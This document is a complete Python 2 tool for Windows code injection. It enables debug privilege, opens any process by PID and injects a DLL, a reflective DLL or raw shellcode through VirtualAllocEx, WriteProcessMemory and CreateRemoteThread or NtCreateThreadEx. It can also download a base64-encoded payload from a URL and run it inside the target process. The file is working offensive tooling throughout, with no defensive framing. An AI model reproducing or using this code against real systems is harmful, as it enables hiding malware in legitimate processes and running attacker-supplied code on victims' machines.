import ctypes
from ctypes import Structure,sizeof, windll, addressof, create_string_buffer
from ctypes.wintypes import DWORD, LPVOID, HMODULE, ULONG, HANDLE
import argparse
import win32security
import win32con
import win32process
import win32api
import sys
import os
import pefile
import urllib2
import base64

kernel32 = ctypes.windll.kernel32
VIRTUAL_MEM = ( 0x1000 | 0x2000 )
PAGE_READWRITE = 0x04
PAGE_EXECUTE_READWRITE = 0x00000040

class MODULEINFO(Structure):
    _fields_ = [("lpBaseOfDll",LPVOID),
                ("SizeOfImage",DWORD),
                ("EntryPoint",LPVOID)]

if sys.maxsize > 2**32:
    proc_64 = True
else:
    proc_64 = False
    
class NtCreateThreadExBufferType(Structure):
    _fields_ = [("size",ULONG),
                ("Unknown1",ULONG),
                ("Unknown2",ULONG),
                ("Unknown3",LPVOID),
                ("Unknown4",ULONG),
                ("Unknown5",ULONG),
                ("Unknown6",ULONG),
                ("Unknown7",LPVOID),
                ("Unknown8",ULONG)]


Enc = None

#Enables a privilege in the current process
#Params:
#privName String (Privilege Constant, https://msdn.microsoft.com/en-us/library/windows/desktop/bb530716%28v=vs.85%29.aspx)
def EnablePriv(privName):
    new_priv = ((win32security.LookupPrivilegeValue('',win32security.SE_DEBUG_NAME),win32con.SE_PRIVILEGE_ENABLED),)
    hCurrProc = win32process.GetCurrentProcess()
    hToken = win32security.OpenProcessToken(hCurrProc,win32security.TOKEN_ALL_ACCESS)
    res = win32security.AdjustTokenPrivileges(hToken,0,new_priv)
    win32api.CloseHandle(hToken)
    return res

#Returns the base address of a module
#Params:
#hProcess win32api.PyHANDLE (Handle of remote process)
#ModName  String 
def GetBaseAddress(hProcess,ModName):
    baseaddr = 0
    imagesize = 0
    BIG_HANDLE_ARRAY = HMODULE * 1024
    arrHandle = BIG_HANDLE_ARRAY()
    needed = DWORD()
    res = windll.psapi.EnumProcessModulesEx(hProcess.__int__(),addressof(arrHandle),sizeof(arrHandle),addressof(needed),0x03)
    if res:
        numofmod = needed.value / sizeof(HMODULE)
        for i in range(numofmod):
            hMod = HMODULE(arrHandle[i])
            TmpModName = create_string_buffer(1024)
            windll.psapi.GetModuleBaseNameA(hProcess.__int__(),hMod,TmpModName,len(TmpModName))
            if ModName.lower()==TmpModName.value.lower():
                ModInfo = MODULEINFO()
                windll.psapi.GetModuleInformation(hProcess.__int__(),hMod,addressof(ModInfo),sizeof(ModInfo))
                baseaddr = ModInfo.lpBaseOfDll
                imagesize = ModInfo.SizeOfImage
                #print "Module name:%s    Base address:%x" % (ModName.value,ModInfo.lpBaseOfDll)
            kernel32.CloseHandle(hMod)
    return (baseaddr,imagesize)


#Returns true in case of a SysWOW64 process
#Param:
#hProcess win32api.PyHANDLE (Handle of the process)
def IsSysWOW64(hProcess):
    syswow64 = False
    BIG_HANDLE_ARRAY = HMODULE * 1024
    arrHandle = BIG_HANDLE_ARRAY()
    needed = DWORD()
    res = windll.psapi.EnumProcessModulesEx(hProcess.__int__(),addressof(arrHandle),sizeof(arrHandle),addressof(needed),0x03)
    if res:
        numofmod = needed.value / sizeof(HMODULE)
        for i in range(numofmod):
            hMod = HMODULE(arrHandle[i])
            TmpModName = create_string_buffer(1024)
            windll.psapi.GetModuleBaseNameA(hProcess.__int__(),hMod,TmpModName,len(TmpModName))
            if "wow64.dll"==TmpModName.value.lower():
                syswow64=True
            kernel32.CloseHandle(hMod)
    return syswow64
        

def EnvironmentCheck():
    if sys.maxsize > 2**32:
        proc_64 = True
    else:
        proc_64 = False
    
    hCurrentProc = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS,0,win32api.GetCurrentProcessId())
    
    sys.stdout.write('[+] Checking environment:\t')
    sys_64 = False
    if proc_64 or ((not proc_64) and IsSysWOW64(hCurrentProc)): sys_64 = True
    
    remote_proc_64 = False
    if sys_64 and (not IsSysWOW64(hProcess)): remote_proc_64 = True
    
    if sys_64: sys.stdout.write('64 bit system architecture.\t')
    else: sys.stdout.write('32 bit system architecture.\n')
    if proc_64 and sys_64: sys.stdout.write('Current process is 64 bit (native).\t')
    if sys_64 and (not proc_64): sys.stdout.write('Current process is 32 bit (WOW64).\t')
    if remote_proc_64: sys.stdout.write('Remote process is 64 bit (native).\n')
    if sys_64 and (not remote_proc_64): sys.stdout.write('Remote process is 32 bit (WOW64).\n')
    
    return (sys_64,proc_64,remote_proc_64)


def StartRemoteThread(hProcess,pFunction,pParam):
    try:
        (hThread,ThreadID) = win32process.CreateRemoteThread(hProcess,None,0,pFunction,pParam,0)
        print "[+] Remote thread started. Thread ID = %d" % ThreadID
    except:
        print "[-] CreateRemoteThread failed"
        print "[+] Failing back to NtCreateThreadEx"
        hThread = HANDLE()
        windll.ntdll.NtCreateThreadEx(addressof(hThread),0x1FFFFF,None,hProcess.__int__(),pFunction,pParam,0,None,None,None,None)
        if hThread.value == None:
            print "[-] NtCreateThreadEx failed."
        else:
            print "[+] Remote thread started."
    
#Does the DLL Injection
#Params:
#hProcess win32api.PyHANDLE (Handle of remote process)
#DllFile  String  (full path of dll to inject)
def InjectDll(hProcess,DllFile):    
    (sys_64,proc_64,remote_proc_64) = EnvironmentCheck()
    
    print "[+] Checking DLL file"
    pef_dll = pefile.PE(DllFile)
    
    if remote_proc_64 and pef_dll.PE_TYPE!=0x20b:
        print "[-] Invalid PE type: %x" % pef_dll.PE_TYPE
        print "Hint: You need to use a 64 bit dll to this process."
        return
    
    if (not remote_proc_64) and pef_dll.PE_TYPE!=0x10b:
        print "[-] Invalid PE type: %x" % pef_dll.PE_TYPE
        print "Hint: You need to use a 32 bit dll to this process."
        return
        
    print "[+] Determining LoadLibraryA address"
    (remoteKernel32Addr,remoteKernel32Size) = GetBaseAddress(hProcess, "kernel32.dll")
    pLoadLibrary = 0
    dllpath = ""
    if (proc_64 and remote_proc_64) or ((not proc_64) and (not remote_proc_64)):
        dllpath = os.environ['systemroot']+r'\system32\kernel32.dll'
    
    if (not proc_64) and remote_proc_64:
        dllpath = os.environ['systemroot']+r'\sysnative\kernel32.dll'
    
    if proc_64 and (not remote_proc_64):
        dllpath = os.environ['systemroot']+r'\syswow64\kernel32.dll'
    
    remote_kernel32 = pefile.PE(dllpath,fast_load=False)
    
    for exp in remote_kernel32.DIRECTORY_ENTRY_EXPORT.symbols:
        if exp.name=='LoadLibraryA': pLoadLibrary = remoteKernel32Addr + exp.address        
    
    if pLoadLibrary == 0:
        print "[-] Invalid LoadLibrary address!"
        return
    
    print "[+] Injecting LoadLibraryA parameters to remote process"    
        
    pathlen = len(DllFile)
    pPathAddr = kernel32.VirtualAllocEx(hProcess.__int__(),0,pathlen,VIRTUAL_MEM,PAGE_READWRITE)
    w = ctypes.c_int(0)
    kernel32.WriteProcessMemory(hProcess.__int__(),pPathAddr,DllFile,pathlen,ctypes.byref(w))
    print "[+] Starting remote thread. (LoadLibraryA) Start address:%x    Parameter address:%x" % (pLoadLibrary,pPathAddr)
    StartRemoteThread(hProcess, pLoadLibrary, pPathAddr)

def InjectDllReflective(hProcess,dllbuffer):
    (sys_64,proc_64,remote_proc_64) = EnvironmentCheck()
    print "[+] Checking DLL file"
    pef_dll = pefile.PE(data=dllbuffer)
    
    if remote_proc_64 and pef_dll.PE_TYPE!=0x20b:
        print "[-] Invalid PE type: %x" % pef_dll.PE_TYPE
        print "Hint: You need to use a 64 bit dll to this process."
        return
    
    if (not remote_proc_64) and pef_dll.PE_TYPE!=0x10b:
        print "[-] Invalid PE type: %x" % pef_dll.PE_TYPE
        print "Hint: You need to use a 32 bit dll to this process."
        return
    
    RVAReflectiveLoader = 0
    ReflectiveLoaderName = ""
    for exp in pef_dll.DIRECTORY_ENTRY_EXPORT.symbols:
        if 'ReflectiveLoader' in exp.name: 
            RVAReflectiveLoader = exp.address
            ReflectiveLoaderName = exp.name
    
    if RVAReflectiveLoader==0:
        print "[-] Could not find exported function: ReflectiveLoader"
        return
    
    print "[+] Dll file OK. Loader function name: %s, RVA: %x" % (ReflectiveLoaderName,RVAReflectiveLoader)
    
    print "[+] Writing DLL data to remote process"
    pRemoteDllBase = kernel32.VirtualAllocEx(hProcess.__int__(),0,len(dllbuffer),VIRTUAL_MEM,PAGE_EXECUTE_READWRITE)
    w = ctypes.c_int(0)
    kernel32.WriteProcessMemory(hProcess.__int__(),pRemoteDllBase,dllbuffer,len(dllbuffer),ctypes.byref(w))
    #print "base addr = %x" % pRemoteDllBase
    #sys.stdin.readline()
    
    pReflectiveLoader = pRemoteDllBase + pef_dll.get_offset_from_rva(RVAReflectiveLoader)
    print "[+] Starting ReflectiveLoader (%s) Start address: %x" % (ReflectiveLoaderName,pReflectiveLoader)    
    #sys.stdin.readline()
    StartRemoteThread(hProcess, pReflectiveLoader, None)


def InjectRawCode(hProcess,codebuffer): 
    print "[+] Writing code to remote process"
    pRemoteCode = kernel32.VirtualAllocEx(hProcess.__int__(),0,len(codebuffer),VIRTUAL_MEM,PAGE_EXECUTE_READWRITE)
    w = ctypes.c_int(0)
    kernel32.WriteProcessMemory(hProcess.__int__(),pRemoteCode,codebuffer,len(codebuffer),ctypes.byref(w))
    print "[+] Starting remote code"
    StartRemoteThread(hProcess, pRemoteCode, None)


def Decode(encoded_buffer):
    if Enc == None:
        return encoded_buffer
    if Enc == "base64":
        return base64.b64decode(encoded_buffer)
    
    return None


def InjectDllReflectiveFile(hProcess,Dllfile):
    fdll = open(Dllfile,"rb")
    dllbuffer = Decode(fdll.read())
    InjectDllReflective(hProcess, dllbuffer)

def InjectDllReflectiveURL(hProcess,url):
    print "[+] Getting %s" % url
    try:
        dllbuffer = Decode(urllib2.urlopen(url).read())
    except:
        print "[-] Failed to open URL"
        return
    InjectDllReflective(hProcess, dllbuffer)

def InjectRawCodeFile(hProcess,BinFile):
    fbin = open(BinFile,"rb")
    codebuffer = Decode(fbin.read())
    InjectRawCode(hProcess, codebuffer)

def InjectRawCodeURL(hProcess,url):
    print "[+] Getting %s" % url
    try:
        dllbuffer = Decode(urllib2.urlopen(url).read())
    except:
        print "[-] Failed to open URL"
        return
    InjectRawCode(hProcess, dllbuffer)


if __name__ == '__main__':
    argparser=argparse.ArgumentParser(description='Incjects code into a process')
    argparser.add_argument('pid',type=int)
    argparser.add_argument('file')
    argparser.add_argument('--type',help='dll, refdll, raw')
    argparser.add_argument('--enc',help='base64')
    args = argparser.parse_args()
    
    if args.type == None:
        args.type='dll'
    
    if not (args.type.lower() in ['dll','refdll','raw']):
        print "[-] Type not implemented!"
        sys.exit(-1)
    
    if not (args.enc==None or (args.enc.lower() in ['base64'])):
        print "[-] Encoding not implemented"
        sys.exit(-1)
    
    if not args.enc==None:
        if args.type.lower()=='dll':
            print "[-] Incompatible options"
            sys.exit(-1)
        Enc = args.enc.lower()
    
    url = False
    if args.file.lower().startswith(r'http://') or args.file.lower().startswith(r'https://'): url = True
    
    if not url:
        if os.path.exists(args.file):
            args.file = os.path.abspath(args.file)
        else:
            print "[-] file does not exist."
            sys.exit(-1)
    
    if not EnablePriv(win32security.SE_DEBUG_NAME):
        print "[-] Failed to enable DEBUG privilege."
        sys.exit(-1)
    else:
        print "[+] Debug privilege enabled."
    
    try:
        hProcess = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS,0,args.pid)
    except:
        print "[-] Failed to open process"
        sys.exit(-1)
    
    
    if args.type.lower() =='dll' and (not url):
        InjectDll(hProcess, args.file)
    
    if args.type.lower() == 'dll' and url:
        print "[-] Not Implemented"
        sys.exit(-1)
    
    if args.type.lower() == 'refdll' and (not url):
        InjectDllReflectiveFile(hProcess,args.file)
    
    if args.type.lower() == 'refdll' and url:
        InjectDllReflectiveURL(hProcess,args.file)    
        
    if (args.type.lower() == 'raw')  and (not url):
        InjectRawCodeFile(hProcess, args.file)
    
    if (args.type.lower() == 'raw') and url:
        InjectRawCodeURL(hProcess,args.file)
        
    hProcess.Close()
        